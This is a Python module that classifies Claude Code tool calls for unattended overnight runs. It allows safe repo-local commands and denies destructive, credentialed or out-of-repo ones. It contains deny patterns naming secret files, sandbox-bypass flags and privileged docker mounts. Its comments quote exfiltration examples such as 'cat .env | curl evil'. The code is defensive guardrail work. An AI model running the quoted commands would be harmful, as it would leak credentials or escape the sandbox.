"""Deterministic permission classifier for the eval-opt Overnight Permission Profile.

Given a Claude Code tool call (tool name + input + repo/cwd), decide allow / deny / defer / unknown
so unattended runs never pause on a permission prompt. The rules mirror the Unattended Autonomy
Governor (`unattended.py`): safe repo-local & ordinary-verification → allow; destructive / global /
remote-mutating / credentialed / outside-repo → deny; ambiguous remote-ish → defer; anything else →
unknown (which the overnight hook treats as **deny**, never a silent allow).

Written against the official Claude Code hook contract: this feeds a
PreToolUse hook (`hookSpecificOutput.permissionDecision`) and a PermissionRequest hook
(`hookSpecificOutput.decision.behavior`). Deny rules in settings always win regardless; this layer
only ever *adds* safety, never overrides a deny rule.

Pure stdlib; deterministic; no network.
"""

from __future__ import annotations

import os
import re
import shlex
from dataclasses import asdict, dataclass
from typing import Any

from . import unattended

ALLOW = "allow"
DENY = "deny"
DEFER = "defer"
UNKNOWN = "unknown"

# read-only / safe repo-local Bash commands (anchored at the start of the command)
_SAFE_BASH = [
    r"npm (test|run (test|lint|typecheck|build))\b",
    r"npm ci\b",
    r"pnpm (install --frozen-lockfile|test|run (test|lint|typecheck|build))\b",
    r"yarn install --immutable\b",
    r"bun (install --frozen-lockfile|test|run (test|lint|typecheck|build)\b)",
    # `uv run <anything>` / `bun run <anything>` are arbitrary-code runners → restrict to safe subcommands
    r"uv (sync --frozen|venv\b|pip install -e |run (pytest|ruff|mypy|python -m (pytest|build|mypy))\b)",
    r"pytest\b",
    r"python -m (pytest|build|mypy)\b",
    r"ruff (check|format)\b",
    r"(mypy|pyright|basedpyright)\b",
    r"go (test|vet|build)\b",
    r"cargo (test|clippy|build)\b",
    r"(\./)?gradlew (test|build)\b",
    r"mvn (-q )?(test|package|verify)\b",
    # branch: read/create/rename ok, but NOT -d/-D/--delete (drops unmerged work); worktree: no
    # `remove` (--force discards uncommitted changes, incl. Codex isolation worktrees) — those fall to
    # UNKNOWN so they are deferred/denied overnight.
    r"git (status|diff|log|show|rev-parse|branch(?!\s+(-[dD]\b|--delete\b))|merge-base|ls-files|remote -v|stash list|worktree (add|list|prune))\b",
    r"(gitleaks|semgrep|trivy|shellcheck|hadolint|actionlint|ast-grep|sg|hyperfine|rg|fd|jq|yq|bat|eza|tree)\b",
    r"shfmt -[dl]\b",
    r"gh pr (checks|view|diff|list)\b",
    r"gh run (list|view)\b",
    r"(ls|cat|head|tail|wc|echo|pwd|which|printf|sort|uniq|cut|sed -n|grep|find|true|test|mkdir -p|date)\b",
    r"docker (build|compose build)\b",
]
_SAFE_BASH_RE = re.compile(r"^\s*(" + "|".join(_SAFE_BASH) + r")", re.I)

# gh read-only api (GET); mutating iff -X/--method non-GET, any -f/-F/--field (implicit POST), or a
# graphql mutation body. Both patterns compose the SAME mutation fragment as the governor's _REMOTE_RE
# (unattended.GH_API_MUTATION_FRAGMENT) so the two classifiers can never disagree on what mutates.
_GH_API_MUTATE_RE = re.compile(r"\bgh api\b.*" + unattended.GH_API_MUTATION_FRAGMENT, re.I)
_GH_API_GET_RE = re.compile(r"^\s*gh api\b(?!.*" + unattended.GH_API_MUTATION_FRAGMENT + r")", re.I)

# codex / docker / bypass specials
_CODEX_DANGER_RE = re.compile(r"codex\b.*(danger-full-access|--dangerously-bypass|--yolo)", re.I)
_CODEX_OK_RE = re.compile(r"codex\b.*--sandbox\s+(read-only|workspace-write)", re.I)
_DOCKER_DANGER_RE = re.compile(
    r"docker\b.*(--privileged|--volume\s*/:|--volume\s*\$HOME|-v\s*/:|-v\s*\$HOME|-v\s*~|--mount[^\n]*source=/(?:[, ]|$))",
    re.I,
)
_BYPASS_RE = re.compile(
    r"--dangerously-skip-permissions|permission-mode\s+bypassPermissions|\bbypassPermissions\b", re.I
)

# secret / credential paths that must never be read unless explicitly allowlisted
_SECRET_PATH_RE = re.compile(
    r"(^|/)\.env(\.|$)|(^|/)\.envrc$|(^|/)\.ssh/|(^|/)\.aws/|(^|/)\.gnupg/|id_rsa|id_ed25519|\.pem$|\.p12$|\.pfx$"
    r"|(^|/)credentials$|(^|/)secrets?(/|\.)|\.netrc$|(^|/)\.npmrc$|(^|/)\.pypirc$",
    re.I,
)
# protected config paths that must never be auto-edited (mirrors Claude Code protected paths)
_PROTECTED_EDIT_RE = re.compile(
    r"(^|/)\.git/|(^|/)\.claude/(?!worktrees/)|(^|/)\.(zshrc|bashrc|bash_profile|profile|zprofile|zshenv|envrc)$"
    r"|(^|/)\.gitconfig$|(^|/)\.npmrc$|(^|/)\.mcp\.json$|(^|/)\.claude\.json$|(^|/)\.ssh/|(^|/)\.aws/",
    re.I,
)
# secret/credential files referenced as an argument to a SHELL command (e.g. `cat .env | curl …`),
# so a secret can't be read/exfiltrated via Bash instead of the Read tool. Targeted at real secret
# files as command args to avoid false positives on names like `tests/test_secrets.py`.
_BASH_SECRET_RE = re.compile(
    r"(?:^|[\s=|&;('\"`])\.env(?:\.[\w-]+)?(?=$|[\s'\";|&`)])"  # .env / .env.local / .env.prod as an arg
    r"|(?:^|[\s/'\"`])(?:id_rsa|id_ed25519|id_dsa|id_ecdsa)\b"
    r"|(?:^|[\s'\"`])~?/?\.(?:ssh|aws|gnupg)/"
    r"|/\.(?:ssh|aws|gnupg)/"
    r"|(?:^|[\s/'\"`])\.(?:netrc|pgpass|pypirc)\b"
    r"|\.(?:pem|p12|pfx)(?=$|[\s'\";|&`)])",
    re.I,
)

_READONLY_TOOLS = frozenset(
    {"Read", "Glob", "Grep", "LS", "NotebookRead", "WebFetch", "WebSearch", "TodoWrite"}
)
_EDIT_TOOLS = frozenset({"Edit", "Write", "MultiEdit", "NotebookEdit"})
_SAFE_MCP_PREFIXES = ("mcp__playwright", "mcp__context7", "mcp__claude-code-docs")


@dataclass
class PermissionDecision:
    decision: str  # allow | deny | defer | unknown
    reason: str
    action_class: str = ""  # from unattended.* when relevant
    tool: str = ""

    def to_dict(self) -> dict[str, Any]:
        return asdict(self)


def _abspath(path: str, cwd: str | None) -> str:
    if not path:
        return ""
    if os.path.isabs(path):
        return os.path.normpath(path)
    return os.path.normpath(os.path.join(cwd or os.getcwd(), path))


def _inside(path: str, root: str) -> bool:
    if not path or not root:
        return False
    try:
        return os.path.commonpath([os.path.realpath(path), os.path.realpath(root)]) == os.path.realpath(root)
    except Exception:
        return False


# --- shell command decomposition (so a safe prefix can't smuggle a dangerous tail) -----------
_SUBST_RE = re.compile(r"\$\(([^()]*)\)|`([^`]*)`")


def _split_top_level(command: str) -> list[str]:
    """Split a command on TOP-LEVEL control operators (``|`` ``||`` ``&&`` ``;`` newline), respecting
    quotes and ``$()``/``()`` nesting so operators inside a quoted arg or a substitution are NOT split
    points. Redirections like ``2>&1`` are left intact (we don't split bare ``&``)."""
    s = command or ""
    segs: list[str] = []
    cur: list[str] = []
    quote: str | None = None
    depth = 0
    i, n = 0, len(s)
    while i < n:
        c = s[i]
        if quote:
            cur.append(c)
            if c == quote:
                quote = None
            i += 1
            continue
        if c in ("'", '"', "`"):
            quote = c
            cur.append(c)
            i += 1
            continue
        if c == "(":
            depth += 1
            cur.append(c)
            i += 1
            continue
        if c == ")":
            depth = max(0, depth - 1)
            cur.append(c)
            i += 1
            continue
        if depth == 0:
            if s[i : i + 2] in ("||", "&&"):
                segs.append("".join(cur))
                cur = []
                i += 2
                continue
            if c in ("|", ";", "\n"):
                segs.append("".join(cur))
                cur = []
                i += 1
                continue
        cur.append(c)
        i += 1
    segs.append("".join(cur))
    return [seg.strip() for seg in segs if seg.strip()]


def _command_units(command: str) -> list[str]:
    """Every command unit to classify: top-level segments plus, recursively, the inner commands of
    any ``$(...)`` / ```...``` substitutions found in each segment."""
    units: list[str] = []
    for seg in _split_top_level(command):
        units.append(seg)
        for m in _SUBST_RE.finditer(seg):
            inner = m.group(1) if m.group(1) is not None else m.group(2)
            if inner and inner.strip():
                units.extend(_command_units(inner))
    if not units and (command or "").strip():
        units = [command.strip()]
    return units


def _unit_is_safe(unit: str) -> bool:
    """A single command unit is safe only if, after removing substitutions, it matches the tight
    known-safe allowlist (codex sandbox / gh read-only / ``_SAFE_BASH_RE``)."""
    base = _SUBST_RE.sub(" ", unit or "").strip()
    if not base:
        return True  # pure substitution wrapper — its inner units are checked separately
    return bool(_CODEX_OK_RE.search(base) or _GH_API_GET_RE.search(base) or _SAFE_BASH_RE.match(base))


# --- shell path-argument extraction (so an allowlisted binary + redirection can't escape the repo) ---
# fd duplications (2>&1, >&2, 1>&-) — a `&` FOLLOWED BY a digit or `-`. A bare `>&` before a filename
# (`>& out`) is NOT a dup; it is a write redirection, so it must not match here.
_FD_DUP_RE = re.compile(r"^\d*[<>]&(?:\d+|-)$")
_DEVNULL_OK = frozenset({"/dev/null", "/dev/stdout", "/dev/stderr", "/dev/tty"})
# Pure file-dump readers: their absolute/~ argument is genuinely a file to read (an exfil vector), so
# it is bounded to the repo. Pattern-taking tools (grep/sed/rg/awk/find) are deliberately NOT here —
# their `/foo/` argument is usually a regex, not a path, and flagging it caused false denials.
_PATH_READ_CMDS = frozenset(
    {"cat", "head", "tail", "less", "more", "tac", "nl", "od", "xxd", "hexdump", "strings", "base64", "cp"}
)
# Commands whose `-o FILE` writes a file (so the target is bounded). grep/rg use -o as a flag with NO
# argument, so gating on the command avoids treating a grep pattern as a write target.
_DASH_O_WRITERS = frozenset({"sort", "tee"})


def _redirect_write_target(tok: str, nxt: str | None) -> tuple[str | None, bool]:
    """If ``tok`` is a WRITE redirection (``>`` ``>>`` ``2>`` ``&>`` ``>&`` ``>|`` glued or spaced),
    return ``(target, consumed_next)``. An fd-dup (``2>&1``) or non-redirection → ``(None, False)``."""
    if _FD_DUP_RE.match(tok):
        return None, False
    m = re.match(r"^(\d*&?>>?)(.*)$", tok)
    if not m or not m.group(1):
        return None, False
    # strip any leading redirection punctuation the operator didn't consume: the `&` of `>&file`,
    # the `|` of `>|file`. Whatever remains is the actual filename.
    glued = m.group(2).lstrip("&|")
    if glued:
        return glued, False
    if nxt is not None:
        return nxt, True
    return None, False


def _bash_path_targets(unit: str) -> tuple[list[str], list[str]]:
    """``(write_targets, read_paths)`` referenced by one command unit. Write targets are redirection
    destinations and ``-o FILE`` for known -o-writers; read paths are absolute/``~``/``$HOME`` arguments
    of a pure file-dump reader only. Best-effort shlex parse; a parse failure yields ``([], [])``."""
    try:
        toks = shlex.split(unit, comments=False)
    except ValueError:
        return [], []
    if not toks:
        return [], []
    cmd = os.path.basename(toks[0])
    reads_ok = cmd in _PATH_READ_CMDS
    writes: list[str] = []
    reads: list[str] = []
    i = 0
    while i < len(toks):
        t = toks[i]
        nxt = toks[i + 1] if i + 1 < len(toks) else None
        target, consumed = _redirect_write_target(t, nxt)
        if target is not None:
            writes.append(target)
            i += 2 if consumed else 1
            continue
        if cmd in _DASH_O_WRITERS and t in ("-o", "--output", "--output-file") and nxt is not None:
            writes.append(nxt)
            i += 2
            continue
        if reads_ok and i > 0 and not t.startswith("-") and t.startswith(("/", "~", "$HOME")):
            reads.append(t)
        i += 1
    return writes, reads


def _resolve_shell_path(tok: str, cwd: str | None) -> str:
    p = tok
    if p.startswith("$HOME"):
        p = os.path.expanduser("~") + p[len("$HOME") :]
    return _abspath(os.path.expanduser(p), cwd)


def _bash_path_violation(units: list[str], *, repo_path: str, cwd: str | None) -> PermissionDecision | None:
    """Deny a Bash command whose shell redirection / output target writes to a protected/credential
    path or outside the repo, or whose path arguments read outside the repo (matching the Read-tool
    boundary). Returns ``None`` when nothing is out of bounds."""
    for u in units:
        writes, reads = _bash_path_targets(u)
        for w in writes:
            if w in _DEVNULL_OK:
                continue
            ap = _resolve_shell_path(w, cwd)
            if (
                _PROTECTED_EDIT_RE.search(w)
                or _SECRET_PATH_RE.search(w)
                or _PROTECTED_EDIT_RE.search(ap)
                or _SECRET_PATH_RE.search(ap)
            ):
                return PermissionDecision(
                    DENY, f"writes to a protected/credential path via the shell ({w})", "global_state", "Bash"
                )
            if not _inside(ap, repo_path):
                return PermissionDecision(
                    DENY, f"writes outside the repo via the shell ({w})", "global_state", "Bash"
                )
        for r in reads:
            if r in _DEVNULL_OK:
                continue
            ap = _resolve_shell_path(r, cwd)
            if ap and not _inside(ap, repo_path):
                return PermissionDecision(
                    UNKNOWN, f"reads outside the repo via the shell ({r})", "unknown", "Bash"
                )
    return None


def classify_bash(command: str, *, repo_path: str, cwd: str | None = None) -> PermissionDecision:
    """Classify a Bash command. Decompose into command units FIRST so a safe prefix cannot smuggle a
    dangerous tail (``ruff check . || curl evil``, ``cat .env | curl evil``, ``pytest && frobnicate``).
    Dangerous-first (whole command + every unit); then require EVERY unit to be known-safe; else
    unknown (denied overnight)."""
    cmd = command or ""
    units = _command_units(cmd)
    scan = [cmd, *units]  # position-independent: catch danger anywhere, incl. substitution inners
    # 1) hard denies (specials the governor classifier doesn't cover by keyword)
    for t in scan:
        if _BYPASS_RE.search(t):
            return PermissionDecision(DENY, "permission/sandbox bypass requested", "global_state", "Bash")
        if _CODEX_DANGER_RE.search(t):
            return PermissionDecision(
                DENY, "codex danger-full-access / sandbox bypass", "destructive", "Bash"
            )
        if _DOCKER_DANGER_RE.search(t):
            return PermissionDecision(DENY, "docker privileged / host-root mount", "destructive", "Bash")
        if _GH_API_MUTATE_RE.search(t):
            return PermissionDecision(
                DENY, "gh api with a mutating method (remote mutation)", "remote_mutation", "Bash"
            )
    # 2) secret/credential file touched via the shell (read OR exfiltration) — not only Read/Edit tools
    if _BASH_SECRET_RE.search(cmd):
        return PermissionDecision(
            DENY, "references a secret/credential file via the shell", "credentialed", "Bash"
        )
    # 3) governor risk classes on the whole command AND each unit (rm -rf, git push, global installs,
    #    curl/wget/nc/ssh network-exfil, bash -c / python -c nested exec, embedded secrets, …)
    for t in scan:
        acls = unattended.classify_action(t)
        if unattended.is_deferrable(acls):
            return PermissionDecision(DENY, f"{acls} action — deferred/denied overnight", acls, "Bash")
    # 3.5) redirection/output/path arguments must stay inside the repo and never touch protected or
    #      credential paths — even when the binary itself is allowlisted (echo … > ~/.claude/settings.json,
    #      sort -o ~/.claude/CLAUDE.md, cat secret > ../out, cat /Users/…/private > x).
    pv = _bash_path_violation(units, repo_path=repo_path, cwd=cwd)
    if pv is not None:
        return pv
    # 4) ALLOW only when EVERY unit is a known-safe repo-local command (no safe-prefix short-circuit)
    if units and all(_unit_is_safe(u) for u in units):
        return PermissionDecision(
            ALLOW, "safe repo-local command (every segment allowlisted)", "safe_repo_local", "Bash"
        )
    # 5) unknown — must NOT be silently allowed overnight
    return PermissionDecision(
        UNKNOWN, "unrecognized/unsafe command segment — not on the safe allowlist", "unknown", "Bash"
    )


def _path_from_input(tool_input: dict[str, Any]) -> str:
    for k in ("file_path", "path", "notebook_path", "filename"):
        if tool_input.get(k):
            return str(tool_input[k])
    return ""


def classify(
    tool_name: str,
    tool_input: dict[str, Any] | None,
    *,
    repo_path: str,
    cwd: str | None = None,
) -> PermissionDecision:
    """Classify any tool call into allow/deny/defer/unknown (overnight-agnostic)."""
    ti = tool_input or {}
    cwd = cwd or repo_path

    if tool_name == "Bash" or tool_name == "WorkspaceBash":
        return classify_bash(str(ti.get("command", "")), repo_path=repo_path, cwd=cwd)

    if tool_name in _READONLY_TOOLS:
        if tool_name in ("WebFetch", "WebSearch", "TodoWrite", "LS"):
            return PermissionDecision(
                ALLOW, "read-only research/navigation tool", "safe_repo_local", tool_name
            )
        path = _abspath(_path_from_input(ti), cwd)
        if path and _SECRET_PATH_RE.search(path):
            return PermissionDecision(DENY, "reads a secret/credential path", "credentialed", tool_name)
        if path and not _inside(path, repo_path):
            return PermissionDecision(UNKNOWN, "reads outside the repo", "unknown", tool_name)
        return PermissionDecision(ALLOW, "read inside repo", "safe_repo_local", tool_name)

    if tool_name in _EDIT_TOOLS:
        path = _abspath(_path_from_input(ti), cwd)
        if not path:
            return PermissionDecision(UNKNOWN, "edit with no resolvable path", "unknown", tool_name)
        if _PROTECTED_EDIT_RE.search(path) or _SECRET_PATH_RE.search(path):
            return PermissionDecision(DENY, "edits a protected/credential path", "global_state", tool_name)
        if not _inside(path, repo_path):
            return PermissionDecision(DENY, "writes outside the repo/worktree", "global_state", tool_name)
        return PermissionDecision(ALLOW, "edit inside repo/worktree", "safe_repo_local", tool_name)

    if tool_name.startswith("mcp__"):
        if tool_name.startswith(_SAFE_MCP_PREFIXES):
            return PermissionDecision(
                ALLOW,
                "safe local/docs MCP (playwright/context7/claude-code-docs)",
                "safe_repo_local",
                tool_name,
            )
        return PermissionDecision(
            DEFER, "non-allowlisted MCP server (possible remote/credentialed)", "remote_mutation", tool_name
        )

    # unknown tool — do not silently allow
    return PermissionDecision(UNKNOWN, f"unrecognized tool {tool_name!r}", "unknown", tool_name)


def decide_overnight(
    tool_name: str,
    tool_input: dict[str, Any] | None,
    *,
    repo_path: str,
    cwd: str | None = None,
) -> PermissionDecision:
    """Final overnight decision: ALLOW only when classify() says allow; otherwise DENY (defer/unknown
    are denied in unattended mode — never a silent allow, never a wait)."""
    d = classify(tool_name, tool_input, repo_path=repo_path, cwd=cwd)
    if d.decision == ALLOW:
        return d
    if d.decision in (DEFER, UNKNOWN):
        return PermissionDecision(DENY, f"{d.decision}: {d.reason}", d.action_class or "unknown", d.tool)
    return d  # already deny


# ------------------------------- hook output builders (verified schemas) -------------------------------


def pretooluse_output(
    tool_name: str, tool_input: dict[str, Any] | None, *, repo_path: str, cwd: str | None = None
) -> dict[str, Any]:
    """PreToolUse hook output. Hard-block known-dangerous (deny), fast-path known-safe (allow), and
    leave unknown/defer to fall through ({}) so dontAsk / the PermissionRequest hook decides."""
    d = classify(tool_name, tool_input, repo_path=repo_path, cwd=cwd)
    if d.decision == ALLOW:
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "allow",
                "permissionDecisionReason": f"eval-opt overnight: {d.reason}",
            }
        }
    if d.decision == DENY:
        return {
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": f"eval-opt overnight blocked ({d.action_class}): {d.reason}",
            }
        }
    return {}  # defer/unknown: do not pre-approve; let rules/mode/PermissionRequest handle it


def permission_request_output(
    tool_name: str, tool_input: dict[str, Any] | None, *, repo_path: str, cwd: str | None = None
) -> dict[str, Any]:
    """PermissionRequest hook output: a prompt would appear → ALLOW safe repo-local, else DENY
    (incl. unknown/defer). Never asks. Uses the verified `decision.behavior` schema."""
    d = decide_overnight(tool_name, tool_input, repo_path=repo_path, cwd=cwd)
    if d.decision == ALLOW:
        return {
            "hookSpecificOutput": {
                "hookEventName": "PermissionRequest",
                "decision": {"behavior": "allow"},
            }
        }
    return {
        "hookSpecificOutput": {
            "hookEventName": "PermissionRequest",
            "decision": {
                "behavior": "deny",
                "message": f"eval-opt overnight: {d.reason} (deferred to the morning report; not run unattended)",
            },
        }
    }


def safe_quote(argv: list[str]) -> str:
    return " ".join(shlex.quote(str(p)) for p in argv)


# ------------------------------- settings merge (for the apply script) -------------------------------


def merge_settings(existing: dict[str, Any], block: dict[str, Any]) -> dict[str, Any]:
    """Merge the eval-opt overnight block into existing settings WITHOUT clobbering unrelated keys.

    - `permissions.allow/deny/ask`: union (existing first, then new, de-duped, order-stable).
    - `hooks.<event>`: append the eval-opt entries that aren't already present.
    - every other top-level key in `existing` is preserved untouched.
    Returns a NEW dict; does not mutate inputs.
    """
    out = {k: (v.copy() if isinstance(v, (dict, list)) else v) for k, v in (existing or {}).items()}

    bperm = (block or {}).get("permissions", {})
    if bperm:
        perms = dict(out.get("permissions", {}) or {})
        for key in ("allow", "deny", "ask"):
            cur = list(perms.get(key, []) or [])
            for rule in bperm.get(key, []) or []:
                if rule not in cur:
                    cur.append(rule)
            if cur:
                perms[key] = cur
        for k, v in bperm.items():
            if k not in ("allow", "deny", "ask"):
                perms.setdefault(k, v)
        out["permissions"] = perms

    bhooks = (block or {}).get("hooks", {})
    if bhooks:
        hooks = {k: list(v) for k, v in (out.get("hooks", {}) or {}).items()}
        for event, entries in bhooks.items():
            cur = list(hooks.get(event, []) or [])
            for entry in entries:
                if entry not in cur:
                    cur.append(entry)
            hooks[event] = cur
        out["hooks"] = hooks
    return out


def apply_overnight_settings(
    settings_path: str, block: dict[str, Any], *, apply: bool = False, ts: str = ""
) -> dict[str, Any]:
    """Dry-run by default. With ``apply=True``: back up the existing settings to
    ``<path>.bak.<ts>``, merge the block, validate JSON, and write. Returns a summary dict and never
    raises on a missing/invalid existing file (treats it as empty)."""
    import json

    existing: dict[str, Any] = {}
    if os.path.isfile(settings_path):
        try:
            with open(settings_path, encoding="utf-8") as fh:
                existing = json.load(fh)
        except Exception:
            existing = {}
    merged = merge_settings(existing, block)
    # JSON validity check (round-trip)
    serialized = json.dumps(merged, indent=2)
    json.loads(serialized)
    added_allow = [
        r
        for r in block.get("permissions", {}).get("allow", [])
        if r not in existing.get("permissions", {}).get("allow", [])
    ]
    added_deny = [
        r
        for r in block.get("permissions", {}).get("deny", [])
        if r not in existing.get("permissions", {}).get("deny", [])
    ]
    summary = {
        "settings_path": settings_path,
        "applied": False,
        "backup_path": "",
        "added_allow": added_allow,
        "added_deny": added_deny,
        "added_hook_events": sorted(block.get("hooks", {}).keys()),
        "preserved_top_level_keys": sorted(k for k in existing if k not in ("permissions", "hooks")),
    }
    if apply:
        if os.path.isfile(settings_path):
            backup = f"{settings_path}.bak.{ts or 'backup'}"
            with open(settings_path, encoding="utf-8") as src, open(backup, "w", encoding="utf-8") as dst:
                dst.write(src.read())
            summary["backup_path"] = backup
        os.makedirs(os.path.dirname(settings_path) or ".", exist_ok=True)
        with open(settings_path, "w", encoding="utf-8") as fh:
            fh.write(serialized + "\n")
        summary["applied"] = True
    return summary


# ------------------------------- readiness assessment -------------------------------


def assess_readiness(facts: dict[str, Any]) -> dict[str, Any]:
    """Turn gathered environment facts into READY / READY_WITH_WARNINGS / NOT_READY + warnings.

    Blocking (NOT_READY): not a git repo. Warnings: missing permission hooks, dirty tree, no
    `.evalopt/config.yaml`, Docker daemon down (only if docker is needed), Codex defaulting to
    danger-full-access, no sleep-prevention. Everything else is informational."""
    warnings: list[str] = []
    blocking: list[str] = []

    if not facts.get("is_git_repo", False):
        blocking.append("not a git repository — eval-opt needs git for diff-scoping and worktrees")
    if not facts.get("permission_hooks_installed", False):
        warnings.append(
            "overnight permission hooks not installed in settings.json — see "
            "examples/claude-code-overnight/README.md (apply_overnight_permissions.py --apply)"
        )
    if not facts.get("elicitation_hook_installed", False):
        warnings.append(
            "MCP Elicitation hook not installed — overnight MCP elicitation could pause the run; "
            "merge examples/claude-code-overnight/elicitation-overnight.block.json with "
            "apply_overnight_permissions.py --apply, or register the Elicitation hook in your Claude Code settings"
        )
    if not facts.get("eval_opt_skill", False):
        warnings.append(
            "eval-opt skill not installed — it is an external Claude Code skill, not part of this package"
        )
    if facts.get("permission_mode") not in ("dontAsk", "acceptEdits", "auto", None):
        warnings.append(
            f"permission mode '{facts.get('permission_mode')}' may prompt overnight — prefer dontAsk/acceptEdits/auto"
        )
    if facts.get("permission_mode") == "bypassPermissions":
        warnings.append("bypassPermissions is active — NOT recommended outside a disposable container/VM")
    if facts.get("working_tree_dirty"):
        warnings.append("working tree is dirty — commit/stash so the diff base is clean")
    if not facts.get("config_yaml_exists", False):
        warnings.append(".evalopt/config.yaml not found — defaults will be used")
    if facts.get("docker_needed") and not facts.get("docker_running", False):
        warnings.append(
            "Docker daemon is not running but the repo declares Docker — start Docker Desktop or set docker=false"
        )
    if facts.get("codex_present") and facts.get("codex_default_full_access"):
        warnings.append("Codex default sandbox is danger-full-access — set full_access_allowed=false")
    if not facts.get("sleep_prevented", False):
        warnings.append("no sleep-prevention detected — run under `caffeinate -dimsu` so the Mac stays awake")

    status = "NOT_READY" if blocking else ("READY_WITH_WARNINGS" if warnings else "READY")
    return {"status": status, "blocking": blocking, "warnings": warnings}
